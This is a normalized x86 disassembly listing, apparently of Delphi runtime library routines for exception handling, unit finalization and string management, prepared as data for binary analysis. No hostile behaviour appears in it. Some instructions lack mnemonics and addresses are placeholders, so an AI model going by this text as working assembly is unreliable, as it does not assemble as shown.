lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405e10
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403694
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c4c
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039f4
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4036dc
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a2c
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403fe4
sub_403a54
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405e10
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4032a0
call sub_40363c
sub_403aa8
call sub_405e10
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4032a0
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403704
jmp edx
sub_403af0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027d0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c50
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cbe
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403cd8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d1e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d78
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405ba4
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d9c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405ba4
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403dc4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403de8
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e44
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e74
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403f00
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403de8
call sub_403e74
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c78
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c50
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405670
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e44
push eax
call sub_401254
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403ff0
push ebp
mov ebp esp
call sub_4031dc
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_4026ec
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_404028
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403ff0
push eax
push esi
push ebx
call sub_401224
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_404074
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026ec
pop eax
sub_404098
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_4040c8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404138
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_40410c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_404138
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026cc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404164
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404138
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404074
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028c8
sub_404194
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4041b4
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4041d0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404074
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4046c0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404194
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404194
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4046c0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404164
jmp r-xdata
sub_40426c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404164
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_40429c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4041d0
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4042e4
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404164
not ecx
sub_404310
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_40433c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_4040c8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4046c0
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4046c0
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028c8
pop edi
pop esi
pop ebx
retn
sub_404380
test edx edx
je r-xdata
mov edx ecx
jmp sub_4040c8
test ecx ecx
je sub_4040c8
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_40433c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404138
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028c8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028c8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_4040c8
pop edx
pop eax
jmp sub_40433c
call sub_4040c8
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4043f4
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404138
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4046c0
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028c8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_4040c8
dec [ edx - 0x8 ]
sub_404480
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404540
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404138
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026ec
sub_404594
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404074
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404164
jmp r-xdata
pop ebx
retn 0x4
sub_4045d4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404540
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028c8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4046c0
mov edi ecx
sub_40461c
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4046c0
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028c8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028c8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404678
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4046c0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404074
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404138
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40270c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028c8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_40476c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404790
test edx edx
je sub_404754
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404754
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
retn
sub_4047b4
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404754
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_40499c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4041b4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4041b4
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40499c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404840
jmp r-xdata
sub_404840
test ecx ecx
je sub_404754
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404864
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404840
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4048cc
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404950
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4048c0
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404840
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_40499c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404744
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40472c
mov ebx eax
mov eax [ edi ]
call sub_4048c0
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028c8
mov eax esi
sub_4049e0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a10
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404a10
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a10
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049e0
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404ab0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404afc
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404afc
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_404098
jmp r-xdata
call sub_404074
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_40476c
jmp r-xdata
call sub_404754
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404ae4
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404afc
dec edi
jg r-xdata
